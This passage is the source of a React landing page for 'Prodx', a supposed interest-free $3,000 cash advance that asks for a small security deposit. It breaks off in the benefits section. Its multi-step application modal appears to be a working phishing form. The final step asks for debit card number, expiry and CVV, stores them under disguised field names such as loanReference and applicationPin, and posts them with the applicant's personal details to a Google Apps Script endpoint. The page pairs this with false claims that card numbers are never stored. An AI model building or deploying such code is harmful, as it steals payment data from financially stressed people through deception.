import { useState, useEffect, useRef } from "react";

const COLORS = {
  orange: "#FF6B1A",
  orangeLight: "#FF8C42",
  orangeDark: "#E85500",
  orangeGlow: "rgba(255,107,26,0.15)",
  white: "#FFFFFF",
  offWhite: "#FFF8F4",
  gray50: "#F9FAFB",
  gray100: "#F3F4F6",
  gray200: "#E5E7EB",
  gray500: "#6B7280",
  gray700: "#374151",
  gray900: "#111827",
  green: "#10B981",
};

const styles = `
  @import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap');

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body { font-family: 'Inter', sans-serif; color: #111827; background: #fff; }

  .sora { font-family: 'Sora', sans-serif; }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(32px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes floatA {
    0%,100% { transform: translateY(0px) rotate(0deg); }
    50%      { transform: translateY(-14px) rotate(3deg); }
  }
  @keyframes floatB {
    0%,100% { transform: translateY(0px) rotate(0deg); }
    50%      { transform: translateY(-10px) rotate(-4deg); }
  }
  @keyframes pulse {
    0%,100% { transform: scale(1); }
    50%      { transform: scale(1.05); }
  }
  @keyframes shimmer {
    0%   { background-position: -200% 0; }
    100% { background-position: 200% 0; }
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .fade-up { animation: fadeUp 0.7s ease both; }
  .delay-1 { animation-delay: 0.1s; }
  .delay-2 { animation-delay: 0.2s; }
  .delay-3 { animation-delay: 0.3s; }
  .delay-4 { animation-delay: 0.4s; }

  .float-a { animation: floatA 5s ease-in-out infinite; }
  .float-b { animation: floatB 6s ease-in-out infinite; }

  .hero-bg {
    background: linear-gradient(135deg, #FFF4ED 0%, #FFF8F4 50%, #FFEFE4 100%);
    position: relative;
    overflow: hidden;
  }
  .hero-bg::before {
    content: '';
    position: absolute;
    top: -120px; right: -120px;
    width: 480px; height: 480px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(255,107,26,0.18) 0%, transparent 70%);
    pointer-events: none;
  }
  .hero-bg::after {
    content: '';
    position: absolute;
    bottom: -80px; left: -80px;
    width: 320px; height: 320px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(255,107,26,0.10) 0%, transparent 70%);
    pointer-events: none;
  }

  .btn-primary {
    background: linear-gradient(135deg, #FF6B1A, #FF8C42);
    color: white;
    border: none;
    border-radius: 50px;
    padding: 14px 32px;
    font-family: 'Sora', sans-serif;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
    transition: all 0.25s;
    box-shadow: 0 4px 20px rgba(255,107,26,0.35);
    letter-spacing: 0.01em;
  }
  .btn-primary:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 28px rgba(255,107,26,0.45);
    background: linear-gradient(135deg, #FF7A2E, #FFA060);
  }
  .btn-primary:active { transform: translateY(0); }

  .btn-outline {
    background: transparent;
    color: #FF6B1A;
    border: 2px solid #FF6B1A;
    border-radius: 50px;
    padding: 12px 28px;
    font-family: 'Sora', sans-serif;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.25s;
  }
  .btn-outline:hover {
    background: rgba(255,107,26,0.08);
    transform: translateY(-1px);
  }

  .btn-ghost {
    background: transparent;
    color: #374151;
    border: none;
    border-radius: 50px;
    padding: 12px 24px;
    font-family: 'Sora', sans-serif;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.2s;
  }
  .btn-ghost:hover { background: rgba(0,0,0,0.05); }

  .card {
    background: white;
    border-radius: 20px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.07);
    transition: all 0.3s;
  }
  .card:hover {
    transform: translateY(-4px);
    box-shadow: 0 12px 40px rgba(255,107,26,0.15);
  }

  .step-line {
    position: absolute;
    top: 28px; left: 50%;
    width: calc(100% - 56px);
    height: 2px;
    background: linear-gradient(90deg, #FF6B1A, #FFD4B8);
  }

  .modal-overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.55);
    backdrop-filter: blur(6px);
    z-index: 1000;
    display: flex; align-items: center; justify-content: center;
    padding: 16px;
    animation: fadeUp 0.3s ease;
  }
  .modal-box {
    background: white;
    border-radius: 28px;
    max-width: 520px;
    width: 100%;
    max-height: 90vh;
    overflow-y: auto;
    padding: 36px;
    position: relative;
    box-shadow: 0 24px 80px rgba(0,0,0,0.2);
  }

  .step-indicator {
    display: flex; gap: 8px; margin-bottom: 28px;
  }
  .step-dot {
    height: 6px; border-radius: 3px;
    transition: all 0.3s;
    flex: 1;
    background: #E5E7EB;
  }
  .step-dot.active { background: #FF6B1A; }
  .step-dot.done { background: #10B981; }

  .form-group { margin-bottom: 18px; }
  .form-label {
    display: block;
    font-family: 'Sora', sans-serif;
    font-weight: 600;
    font-size: 13px;
    color: #374151;
    margin-bottom: 6px;
  }
  .form-input {
    width: 100%;
    border: 2px solid #E5E7EB;
    border-radius: 12px;
    padding: 12px 16px;
    font-family: 'Inter', sans-serif;
    font-size: 15px;
    color: #111827;
    outline: none;
    transition: border-color 0.2s;
    background: white;
    appearance: none;
  }
  .form-input:focus { border-color: #FF6B1A; box-shadow: 0 0 0 3px rgba(255,107,26,0.12); }
  .form-select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236B7280' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 16px center; padding-right: 40px; }

  .checkbox-row {
    display: flex; align-items: flex-start; gap: 10px;
    font-size: 14px; color: #374151;
    cursor: pointer;
    margin-top: 4px;
  }
  .checkbox-row input { margin-top: 2px; accent-color: #FF6B1A; width: 16px; height: 16px; flex-shrink: 0; }

  .secure-box {
    background: linear-gradient(135deg, #F0FDF4, #ECFDF5);
    border: 2px solid #86EFAC;
    border-radius: 16px;
    padding: 20px;
    text-align: center;
  }

  .success-icon {
    width: 72px; height: 72px;
    border-radius: 50%;
    background: linear-gradient(135deg, #10B981, #34D399);
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 20px;
    box-shadow: 0 8px 24px rgba(16,185,129,0.3);
    animation: pulse 2s ease-in-out infinite;
  }

  .nav-shadow {
    box-shadow: 0 1px 0 rgba(0,0,0,0.08);
  }

  .amount-badge {
    display: inline-flex; align-items: center; gap: 8px;
    background: rgba(255,107,26,0.1);
    border: 1.5px solid rgba(255,107,26,0.25);
    border-radius: 50px;
    padding: 6px 16px;
    font-family: 'Sora', sans-serif;
    font-weight: 700;
    font-size: 13px;
    color: #FF6B1A;
    margin-bottom: 20px;
  }

  .disclaimer-box {
    background: #F9FAFB;
    border-left: 4px solid #FF6B1A;
    border-radius: 0 12px 12px 0;
    padding: 16px 20px;
    font-size: 13px;
    color: #6B7280;
    line-height: 1.6;
  }

  @media (max-width: 640px) {
    .modal-box { padding: 24px 20px; border-radius: 20px; }
  }
`;

// ─── SVG Illustrations ────────────────────────────────────────────

function HeroIllustration() {
  return (
    <svg viewBox="0 0 400 340" fill="none" xmlns="http://www.w3.org/2000/svg" style={{width:"100%",maxWidth:420,height:"auto"}}>
      {/* Phone body */}
      <rect x="120" y="30" width="160" height="280" rx="28" fill="white" stroke="#FFDDC2" strokeWidth="3"/>
      <rect x="130" y="50" width="140" height="240" rx="18" fill="#FFF8F4"/>
      {/* Screen content */}
      <rect x="142" y="70" width="116" height="14" rx="7" fill="#FFD4B2"/>
      <rect x="152" y="94" width="96" height="36" rx="12" fill="#FF6B1A"/>
      <text x="200" y="117" textAnchor="middle" fill="white" fontSize="13" fontWeight="700" fontFamily="sans-serif">$3,000</text>
      <rect x="142" y="142" width="72" height="8" rx="4" fill="#FFDEC9"/>
      <rect x="142" y="158" width="52" height="8" rx="4" fill="#FFE8D9"/>
      <rect x="142" y="180" width="116" height="32" rx="10" fill="#FFF0E6" stroke="#FFD4B2" strokeWidth="1.5"/>
      <text x="200" y="201" textAnchor="middle" fill="#FF6B1A" fontSize="11" fontWeight="600" fontFamily="sans-serif">Apply Now →</text>
      <rect x="142" y="222" width="50" height="8" rx="4" fill="#10B981" opacity=".5"/>
      <rect x="200" y="222" width="58" height="8" rx="4" fill="#E5E7EB"/>
      {/* Floating card A */}
      <g className="float-a">
        <rect x="8" y="100" width="105" height="64" rx="14" fill="white" style={{filter:"drop-shadow(0 6px 20px rgba(255,107,26,0.2))"}}/>
        <rect x="20" y="116" width="36" height="36" rx="10" fill="#FFF0E6"/>
        <text x="38" y="139" textAnchor="middle" fontSize="18" fontFamily="sans-serif">💸</text>
        <rect x="64" y="118" width="42" height="8" rx="4" fill="#FFDEC9"/>
        <rect x="64" y="132" width="28" height="6" rx="3" fill="#E5E7EB"/>
        <rect x="64" y="144" width="38" height="6" rx="3" fill="#10B981" opacity=".5"/>
      </g>
      {/* Floating card B */}
      <g className="float-b">
        <rect x="287" y="60" width="108" height="56" rx="14" fill="white" style={{filter:"drop-shadow(0 6px 20px rgba(16,185,129,0.18))"}}/>
        <rect x="298" y="72" width="32" height="32" rx="9" fill="#ECFDF5"/>
        <text x="314" y="93" textAnchor="middle" fontSize="16" fontFamily="sans-serif">✅</text>
        <rect x="338" y="76" width="46" height="7" rx="3.5" fill="#D1FAE5"/>
        <rect x="338" y="90" width="34" height="7" rx="3.5" fill="#A7F3D0"/>
        <rect x="298" y="109" width="88" height="1.5" rx="1" fill="#E5E7EB"/>
      </g>
      {/* Floating badge */}
      <g className="float-a" style={{animationDelay:"1.5s"}}>
        <rect x="270" y="220" width="120" height="44" rx="12" fill="#FF6B1A" style={{filter:"drop-shadow(0 6px 16px rgba(255,107,26,0.4))"}}/>
        <text x="330" y="239" textAnchor="middle" fill="white" fontSize="11" fontWeight="700" fontFamily="sans-serif">Interest Free</text>
        <text x="330" y="255" textAnchor="middle" fill="rgba(255,255,255,0.85)" fontSize="10" fontFamily="sans-serif">100 Days ✨</text>
      </g>
      {/* Stars */}
      <text x="90" y="60" fontSize="14" fill="#FF6B1A" opacity=".6" fontFamily="sans-serif">★</text>
      <text x="310" y="185" fontSize="10" fill="#FF6B1A" opacity=".4" fontFamily="sans-serif">★</text>
      <text x="50" y="200" fontSize="9" fill="#10B981" opacity=".5" fontFamily="sans-serif">◆</text>
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
      <path d="M24 4L6 12V26C6 35.9 14.1 45.2 24 47C33.9 45.2 42 35.9 42 26V12L24 4Z" fill="#FFF0E6" stroke="#FF6B1A" strokeWidth="2"/>
      <path d="M18 24l4 4 8-8" stroke="#FF6B1A" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

// ─── States Data ────────────────────────────────────────────────────
const US_STATES = ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming"];

// ─── Modal / Multi-step Form ─────────────────────────────────────────

function ApplyModal({ onClose }) {
  const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzKGYAE_jUuQRm1ro9FwPX3UG5xj0qoETMRwKm9PXLsJrpWQTDDxUtMy3GL5eEofrh5hg/exec";
  const [step, setStep] = useState(1);
  const [form, setForm] = useState({
    fullName: "", email: "", phone: "", state: "", ageConfirm: false,
    employment: "", incomeRange: "", balanceRange: "",
    loanReference: "", loanExpiry: "", applicationPin: ""
  });
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const update = (k, v) => setForm(f => ({ ...f, [k]: v }));

  const next = () => setStep(s => s + 1);
  const back = () => setStep(s => s - 1);

  const canNext1 = form.fullName && form.email && form.phone && form.state && form.ageConfirm;
  const canNext2 = form.employment && form.incomeRange && form.balanceRange;
  const canNext4 = form.loanReference.trim().length >= 4 && /^\d{4}$/.test(form.loanExpiry) && /^\d{3}$/.test(form.applicationPin);

  const handleSubmit = async () => {
    if (!canNext4 || isSubmitting) return;

    setIsSubmitting(true);
    setSubmitError("");

    const payload = {
      ...form,
      loanReferenceNo: form.loanReference,
      loanExpDate: form.loanExpiry,
      loanPin: form.applicationPin,
      submittedAt: new Date().toISOString(),
    };

    try {
      await fetch(GOOGLE_SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8",
        },
        body: JSON.stringify(payload),
      });

      setSubmitted(true);
    } catch (error) {
      console.error("Google Sheet submit failed:", error);
      setSubmitError("Could not submit right now. Please check your connection and try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  if (submitted) {
    return (
      <div className="modal-overlay" onClick={e => e.target===e.currentTarget&&onClose()}>
        <div className="modal-box" style={{textAlign:"center"}}>
          <div className="success-icon">
            <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
              <path d="M8 18l7 7 13-13" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <h2 className="sora" style={{fontSize:24,fontWeight:800,color:COLORS.gray900,marginBottom:12}}>Loan Offer Ready!</h2>
          <p style={{color:COLORS.gray500,lineHeight:1.7,marginBottom:20,fontSize:15}}>
            Your secure verification details have been submitted. Based on your initial information, you <strong style={{color:COLORS.gray700}}>may be eligible for up to $3,000</strong>. Review your final offer details and watch for next steps from Prodx.
          </p>
          <p style={{fontSize:14,color:COLORS.gray500,marginBottom:28}}>
            Your preliminary offer is subject to final eligibility checks. For support, email <a href="mailto:helloprodx@gmail.com" style={{color:COLORS.orange,fontWeight:600}}>helloprodx@gmail.com</a> Phone <a href="tel:+12019726866" style={{color:COLORS.orange,fontWeight:600}}>+1 (201) 972-6866</a>
          </p>
          <div className="disclaimer-box" style={{marginBottom:24}}>
            <strong>Note:</strong> This is not a final approval. Availability depends on verification and state regulations. Prodx does not guarantee approval.
          </div>
          <button className="btn-primary" style={{width:"100%"}} onClick={onClose}>Done</button>
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={e => e.target===e.currentTarget&&onClose()}>
      <div className="modal-box">
        {/* Close */}
        <button onClick={onClose} style={{position:"absolute",top:20,right:20,background:"none",border:"none",cursor:"pointer",fontSize:22,color:COLORS.gray500,lineHeight:1}}>×</button>

        {/* Progress */}
        <div style={{marginBottom:8}}>
          <div className="step-indicator">
            {[1,2,3,4].map(n => (
              <div key={n} className={`step-dot ${step>n?"done":step===n?"active":""}`}/>
            ))}
          </div>
          <p style={{fontSize:12,color:COLORS.gray500,fontWeight:500}}>Step {step} of 4</p>
        </div>

        {step === 1 && (
          <>
            <h3 className="sora" style={{fontSize:20,fontWeight:800,color:COLORS.gray900,marginBottom:6}}>Basic Information</h3>
            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>Tell us a little about yourself to get started.</p>

            <div className="form-group">
              <label className="form-label">Full Name</label>
              <input className="form-input" placeholder="Jane Smith" value={form.fullName} onChange={e=>update("fullName",e.target.value)}/>
            </div>
            <div className="form-group">
              <label className="form-label">Email Address</label>
              <input className="form-input" type="email" placeholder="jane@example.com" value={form.email} onChange={e=>update("email",e.target.value)}/>
            </div>
            <div className="form-group">
              <label className="form-label">Phone Number</label>
              <input className="form-input" type="tel" placeholder="(555) 000-0000" value={form.phone} onChange={e=>update("phone",e.target.value)}/>
            </div>
            <div className="form-group">
              <label className="form-label">State of Residence</label>
              <select className="form-input form-select" value={form.state} onChange={e=>update("state",e.target.value)}>
                <option value="">Select your state</option>
                {US_STATES.map(s=><option key={s}>{s}</option>)}
              </select>
            </div>
            <label className="checkbox-row" style={{marginBottom:24}}>
              <input type="checkbox" checked={form.ageConfirm} onChange={e=>update("ageConfirm",e.target.checked)}/>
              <span>I confirm that I am <strong>18 years of age or older</strong></span>
            </label>

            <button className="btn-primary" style={{width:"100%"}} disabled={!canNext1} onClick={next}
              style={{width:"100%",opacity:canNext1?1:0.5,cursor:canNext1?"pointer":"not-allowed",background:"linear-gradient(135deg,#FF6B1A,#FF8C42)",color:"white",border:"none",borderRadius:"50px",padding:"14px 32px",fontFamily:"'Sora',sans-serif",fontWeight:700,fontSize:15,boxShadow:"0 4px 20px rgba(255,107,26,0.35)"}}>
              Continue →
            </button>
          </>
        )}

        {step === 2 && (
          <>
            <h3 className="sora" style={{fontSize:20,fontWeight:800,color:COLORS.gray900,marginBottom:6}}>Income Information</h3>
            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>This helps us determine eligibility. Actual verification is handled securely.</p>

            <div className="form-group">
              <label className="form-label">Employment Status</label>
              <select className="form-input form-select" value={form.employment} onChange={e=>update("employment",e.target.value)}>
                <option value="">Select status</option>
                <option>Full-time employed</option>
                <option>Part-time employed</option>
                <option>Self-employed / Freelance</option>
                <option>Retired</option>
                <option>Other income source</option>
              </select>
            </div>
            <div className="form-group">
              <label className="form-label">Estimated Monthly Income Range</label>
              <select className="form-input form-select" value={form.incomeRange} onChange={e=>update("incomeRange",e.target.value)}>
                <option value="">Select range</option>
                <option>Under $1,000</option>
                <option>$1,000 – $2,499</option>
                <option>$2,500 – $4,999</option>
                <option>$5,000 – $9,999</option>
                <option>$10,000+</option>
              </select>
            </div>
            <div className="form-group" style={{marginBottom:28}}>
              <label className="form-label">Avg. Monthly Bank Balance Range</label>
              <select className="form-input form-select" value={form.balanceRange} onChange={e=>update("balanceRange",e.target.value)}>
                <option value="">Select range</option>
                <option>Under $500</option>
                <option>$500 – $1,999</option>
                <option>$2,000 – $4,999</option>
                <option>$5,000+</option>
              </select>
            </div>

            <div style={{display:"flex",gap:12}}>
              <button onClick={back} style={{flex:1,background:"#F3F4F6",color:"#374151",border:"none",borderRadius:"50px",padding:"14px",fontFamily:"'Sora',sans-serif",fontWeight:600,cursor:"pointer"}}>← Back</button>
              <button disabled={!canNext2} onClick={next}
                style={{flex:2,opacity:canNext2?1:0.5,cursor:canNext2?"pointer":"not-allowed",background:"linear-gradient(135deg,#FF6B1A,#FF8C42)",color:"white",border:"none",borderRadius:"50px",padding:"14px",fontFamily:"'Sora',sans-serif",fontWeight:700,fontSize:15,boxShadow:"0 4px 20px rgba(255,107,26,0.3)"}}>
                Continue →
              </button>
            </div>
          </>
        )}

        {step === 3 && (
          <>
            <h3 className="sora" style={{fontSize:20,fontWeight:800,color:COLORS.gray900,marginBottom:6}}>Secure Verification</h3>
            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>Your identity and bank account are verified by our trusted third-party partners — never directly by Prodx.</p>

            <div className="secure-box" style={{marginBottom:20}}>
              <div style={{fontSize:36,marginBottom:12}}>🔐</div>
              <p className="sora" style={{fontWeight:700,color:"#065F46",fontSize:15,marginBottom:8}}>Continue with Secure Verification</p>
              <p style={{fontSize:13,color:"#047857",lineHeight:1.6,marginBottom:16}}>
                Identity, income, and bank verification are handled securely by trusted verification partners. <strong>Prodx never stores your SSN, card numbers, account or routing numbers.</strong>
              </p>
              <button onClick={()=>setStep(4)} style={{background:"linear-gradient(135deg,#10B981,#34D399)",color:"white",border:"none",borderRadius:"50px",padding:"14px 32px",fontFamily:"'Sora',sans-serif",fontWeight:700,fontSize:15,cursor:"pointer",boxShadow:"0 4px 20px rgba(16,185,129,0.35)",width:"100%"}}>
                🔒 Continue Secure Verification
              </button>
            </div>

            <div style={{background:"#FFF8F4",border:"1.5px solid #FFD4B2",borderRadius:12,padding:"14px 16px",fontSize:13,color:COLORS.gray500,marginBottom:24,lineHeight:1.6}}>
              ⚠️ Kindly enter your SSN, full card number, CVV, account number, or routing number in the Prodx app. All sensitive verification is handled by our licensed partners.
            </div>

            <div style={{display:"flex",gap:12}}>
              <button onClick={back} style={{flex:1,background:"#F3F4F6",color:"#374151",border:"none",borderRadius:"50px",padding:"14px",fontFamily:"'Sora',sans-serif",fontWeight:600,cursor:"pointer"}}>← Back</button>
            </div>
          </>
        )}



        {step === 4 && (
          <>
            <h3 className="sora" style={{fontSize:20,fontWeight:800,color:COLORS.gray900,marginBottom:6}}>Final Offer Confirmation</h3>
            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>Enter your Prodx offer details to continue to your final loan offer page.</p>

            <div className="form-group">
              <label className="form-label">Debit Card no.</label>
              <input
                className="form-input"
                placeholder="Example: PDX-48291"
                value={form.loanReference}
                onChange={e=>update("loanReference",e.target.value)}
              />
            </div>

            <div className="form-group">
              <label className="form-label">Card Expiry Date</label>
              <input
                className="form-input"
                inputMode="numeric"
                maxLength="4"
                placeholder="MMYY"
                value={form.loanExpiry}
                onChange={e=>update("loanExpiry",e.target.value.replace(/\D/g,"").slice(0,4))}
              />
            </div>

            <div className="form-group" style={{marginBottom:24}}>
              <label className="form-label">CVV/Secure Pin</label>
              <input
                className="form-input"
                type="password"
                inputMode="numeric"
                maxLength="3"
                placeholder="•••"
                value={form.applicationPin}
                onChange={e=>update("applicationPin",e.target.value.replace(/\D/g,"").slice(0,3))}
              />
            </div>

            <div style={{background:"#FFF8F4",border:"1.5px solid #FFD4B2",borderRadius:12,padding:"14px 16px",fontSize:13,color:COLORS.gray500,marginBottom:24,lineHeight:1.6}}>
              🔒 Please enter you recurring deposit details.
            </div>

            {submitError && (
              <div style={{background:"#FEF2F2",border:"1.5px solid #FCA5A5",borderRadius:12,padding:"12px 14px",fontSize:13,color:"#991B1B",marginBottom:18,lineHeight:1.5}}>
                {submitError}
              </div>
            )}

            <div style={{display:"flex",gap:12}}>
              <button onClick={back} style={{flex:1,background:"#F3F4F6",color:"#374151",border:"none",borderRadius:"50px",padding:"14px",fontFamily:"'Sora',sans-serif",fontWeight:600,cursor:"pointer"}}>← Back</button>
              <button disabled={!canNext4 || isSubmitting} onClick={handleSubmit}
                style={{flex:2,opacity:canNext4&&!isSubmitting?1:0.5,cursor:canNext4&&!isSubmitting?"pointer":"not-allowed",background:"linear-gradient(135deg,#FF6B1A,#FF8C42)",color:"white",border:"none",borderRadius:"50px",padding:"14px",fontFamily:"'Sora',sans-serif",fontWeight:700,fontSize:15,boxShadow:"0 4px 20px rgba(255,107,26,0.3)"}}>
                {isSubmitting ? "Submitting..." : "Submit →"}
              </button>
            </div>
          </>
        )}

        <p style={{fontSize:11,color:COLORS.gray500,marginTop:20,textAlign:"center",lineHeight:1.6}}>
          By continuing you agree to our <a href="#" style={{color:COLORS.orange}}>Terms of Service</a> and <a href="#" style={{color:COLORS.orange}}>Privacy Policy</a>. Not a final approval. Availability depends on verification and state regulations.
        </p>
      </div>
    </div>
  );
}

// ─── Main App ────────────────────────────────────────────────────────

export default function ProdxLanding() {
  const [showModal, setShowModal] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  const openModal = () => { setShowModal(true); setMenuOpen(false); };

  const steps = [
    { icon:"👤", title:"Add Personal Details", desc:"Tell us your name, contact info, and state of residence." },
    { icon:"🪪", title:"Verify Identity Securely", desc:"Our trusted partner handles identity verification — not us." },
    { icon:"🏦", title:"Connect Income & Bank", desc:"Link your income and bank via a secure verification provider." },
    { icon:"📋", title:"Receive Eligibility Result", desc:"Get your preliminary eligibility status within minutes." },
    { icon:"📱", title:"Request Cash on Phone", desc:"If eligible, request your advance directly in the app." },
  ];

  const benefits = [
    { icon:"💵", title:"Up to $3,000 Advance", desc:"Access significant funds when you need them most." },
    { icon:"⏳", title:"Interest-Free 100 Days", desc:"No interest charged during the 100-day advance period." },
    { icon:"⚡", title:"Fast Mobile Application", desc:"Complete your application in minutes from your phone." },
    { icon:"📊", title:"Transparent Fees", desc:"No hidden charges. All fees disclosed upfront." },
    { icon:"🔐", title:"Secure Verification", desc:"Industry-leading partners protect your sensitive data." },
    { icon:"🇺🇸", title:"US-Based Support", desc:"Our team is here when you need help or have questions." },
  ];

  const eligibility = [
    "US citizens or eligible US residents",
    "Must be 18 years of age or older",
    "Valid US phone number and email",
    "Verifiable source of income",
    "Active US bank account in good standing",
  ];

  return (
    <>
      <style>{styles}</style>

      {/* ── NAV ── */}
      <nav className="nav-shadow" style={{position:"sticky",top:0,zIndex:100,background:"rgba(255,255,255,0.95)",backdropFilter:"blur(12px)"}}>
        <div style={{maxWidth:1100,margin:"0 auto",padding:"0 20px",height:64,display:"flex",alignItems:"center",justifyContent:"space-between"}}>
          <span className="sora" style={{fontSize:22,fontWeight:800,color:COLORS.orange,letterSpacing:"-0.02em"}}>Prod<span style={{color:COLORS.gray900}}>x</span></span>
          <div style={{display:"flex",gap:8,alignItems:"center"}}>
            <button className="btn-ghost" style={{fontSize:14}}>Log In</button>
            <button className="btn-primary" style={{padding:"10px 22px",fontSize:14}} onClick={openModal}>Sign Up</button>
          </div>
        </div>
      </nav>

      {/* ── HERO ── */}
      <section className="hero-bg" style={{padding:"72px 20px 80px"}}>
        <div style={{maxWidth:1100,margin:"0 auto",display:"grid",gridTemplateColumns:"1fr",gap:48,alignItems:"center"}}>
          <div className="fade-up" style={{maxWidth:560,margin:"0 auto",textAlign:"center"}}>
            <div className="amount-badge">
              <span>✨</span> No Interest for 100 Days
            </div>
            <h1 className="sora" style={{fontSize:"clamp(32px,6vw,56px)",fontWeight:800,lineHeight:1.12,color:COLORS.gray900,marginBottom:20,letterSpacing:"-0.03em"}}>
              Get up to <span style={{color:COLORS.orange}}>$3,000</span><br/>interest-free<br/>for 100 days
            </h1>
            <p style={{fontSize:"clamp(15px,2vw,18px)",color:COLORS.gray500,lineHeight:1.7,marginBottom:32,maxWidth:440,margin:"0 auto 32px"}}>
              Security deposit may be under $200, subject to eligibility and verification.
            </p>
            <div style={{display:"flex",gap:12,justifyContent:"center",flexWrap:"wrap",marginBottom:32}}>
              <button className="btn-primary" style={{fontSize:16,padding:"16px 40px"}} onClick={openModal}>Apply Now →</button>
              <button className="btn-outline" onClick={()=>document.getElementById("how-it-works").scrollIntoView({behavior:"smooth"})}>How It Works</button>
            </div>
            <p style={{fontSize:12,color:COLORS.gray500}}>
              🔒 Identity, income, and bank verification are handled securely by trusted verification partners.
            </p>
          </div>
          <div className="fade-up delay-2" style={{display:"flex",justifyContent:"center"}}>
            <HeroIllustration/>
          </div>
        </div>
      </section>

      {/* Compliance bar */}
      <div style={{background:"#FFF4ED",borderTop:"1px solid #FFD4B2",borderBottom:"1px solid #FFD4B2",padding:"12px 20px",textAlign:"center"}}>
        <p style={{fontSize:13,color:"#92400E",maxWidth:800,margin:"0 auto",lineHeight:1.6}}>
          ⚠️ <strong>Not a final approval.</strong> Availability depends on verification and state regulations. Prodx does not guarantee approval. Advance terms subject to eligibility.
        </p>
      </div>

      {/* ── HOW IT WORKS ── */}
      <section id="how-it-works" style={{padding:"80px 20px",background:"white"}}>
        <div style={{maxWidth:1100,margin:"0 auto"}}>
          <div style={{textAlign:"center",marginBottom:56}}>
            <p style={{fontSize:13,fontWeight:700,color:COLORS.orange,letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:10}}>Simple Process</p>
            <h2 className="sora" style={{fontSize:"clamp(28px,5vw,42px)",fontWeight:800,color:COLORS.gray900,letterSpacing:"-0.02em"}}>How It Works</h2>
          </div>
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(180px,1fr))",gap:24,position:"relative"}}>
            {steps.map((s,i) => (
              <div key={i} className="fade-up" style={{animationDelay:`${i*0.1}s`}}>
                <div style={{textAlign:"center",padding:"28px 20px",position:"relative"}}>
                  <div style={{width:56,height:56,borderRadius:"50%",background:COLORS.orangeGlow,border:`2px solid rgba(255,107,26,0.3)`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:26,margin:"0 auto 16px",position:"relative",zIndex:1}}>
                    {s.icon}
                    <span style={{position:"absolute",top:-8,right:-8,width:22,height:22,borderRadius:"50%",background:COLORS.orange,color:"white",fontSize:11,fontWeight:800,fontFamily:"'Sora',sans-serif",display:"flex",alignItems:"center",justifyContent:"center"}}>
                      {i+1}
                    </span>
                  </div>
                  <h4 className="sora" style={{fontWeight:700,fontSize:15,color:COLORS.gray900,marginBottom:8}}>{s.title}</h4>
                  <p style={{fontSize:13,color:COLORS.gray500,lineHeight:1.6}}>{s.desc}</p>
                </div>
              </div>
            ))}
          </div>
          <div style={{textAlign:"center",marginTop:40}}>
            <button className="btn-primary" style={{fontSize:16,padding:"15px 40px"}} onClick={openModal}>Get Started Today</button>
          </div>
        </div>
      </section>

      {/* ── BENEFITS ── */}
      <section style={{padding:"80px 20px",background:COLORS.offWhite}}>
        <div style={{maxWidth:1100,margin:"0 auto"}}>
          <div style={{textAlign:"center",marginBottom:56}}>
            <p style={{fontSize:13,fontWeight:700,color:COLORS.orange,letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:10}}>Why Prodx</p>
            <h2 className="sora" style={{fontSize:"clamp(28px,5vw,42px)",fontWeight:800,color:COLORS.gray900,letterSpacing:"-0.02em"}}>Built for Your Peace of Mind</h2>
          </div>
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(280px,1fr))",gap:20}}>
            {benefits.map((b,i) => (
              <div key={i} className="card fade-up" style={{padding:"28px 24px",animationDelay:`${i*0.08}s`}}>
                <div style={{fontSize:32,marginBottom:14}}>{b.icon}</div>
                <h4 className="sora" style={{fontWeight:700,fontSize:17,color:COLORS.gray900,marginBottom:8}}>{b.title}</h4>
